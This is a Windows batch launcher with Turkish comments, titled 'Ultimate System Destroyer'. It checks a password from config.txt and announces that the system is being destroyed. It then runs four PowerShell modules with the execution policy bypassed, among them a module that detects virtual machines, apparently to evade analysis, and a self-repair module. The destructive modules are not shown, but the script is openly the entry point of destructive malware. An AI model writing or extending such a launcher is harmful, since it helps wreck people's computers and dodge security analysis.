@echo off
chcp 65001 >nul
title EN - Ultimate System Destroyer
color 0c
cls

:: ============================================================
:: 1. ŞİFRE KONTROLÜ (config.txt'den okur)
:: ============================================================
if exist config.txt (
    for /f "tokens=1,2 delims==" %%a in (config.txt) do (
        if "%%a"=="SIFRE" set sifre=%%b
    )
)

if defined sifre if not "%sifre%"=="" (
    set /p girilen="[EN] Sifre: "
    if not "%girilen%"=="%sifre%" (
        echo [EN] Hatali sifre.
        timeout /t 2 /nobreak >nul
        exit
    )
)

:: ============================================================
:: 2. ANA MENU
:: ============================================================
echo ============================================================
echo   EN AKTIF
echo ============================================================
echo   Sistem yok ediliyor...
echo ============================================================
echo.
echo   Devam etmek icin bir tusa basin...
pause >nul

:: ============================================================
:: 3. MODULLER (SIRALI OLARAK CALISTIRILIR)
:: ============================================================

:: 3.1 Güvenlik Duvarı (VM / Host kontrolü + deneme sayacı)
powershell -ExecutionPolicy Bypass -File modul_guvenlik_duvari.ps1
if %errorlevel% neq 0 exit

:: 3.2 Kendi Kendini Tamir (eksik dosyaları kontrol eder)
powershell -ExecutionPolicy Bypass -File modul_kendi_tamir.ps1

:: 3.3 Ayar Okuyucu (config.txt'den tüm ayarları okur)
powershell -ExecutionPolicy Bypass -File modul_ayar_oku.ps1

:: 3.4 Ana Döngü (tüm modülleri yönetir)
powershell -ExecutionPolicy Bypass -File modul_ana_dongu.ps1

:: ============================================================
:: 4. BİTİŞ (Normal şartlarda buraya gelinmez, ama yine de)
:: ============================================================
echo [EN] Program sonlandirildi.
pause >nul